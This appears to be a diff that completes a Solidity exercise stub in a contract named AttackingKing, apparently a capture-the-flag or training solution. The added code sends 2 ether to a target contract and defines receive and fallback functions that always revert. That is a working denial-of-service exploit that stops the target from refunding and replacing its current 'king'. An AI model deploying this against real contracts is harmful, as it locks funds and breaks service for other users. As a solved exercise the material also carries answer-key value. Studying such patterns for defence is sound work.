@@ -11,6 +11,16 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        // we have to use call instead of transfer/send because the receive method needs more
+        // than 2300 gas to execute
+        payable(contractAddress).call{value: 2 ether}("");
+    }
+
+    receive() external payable {
+        revert("sorry");
+    }
+
+    fallback() external payable {
+        revert("sorry");
     }
 }
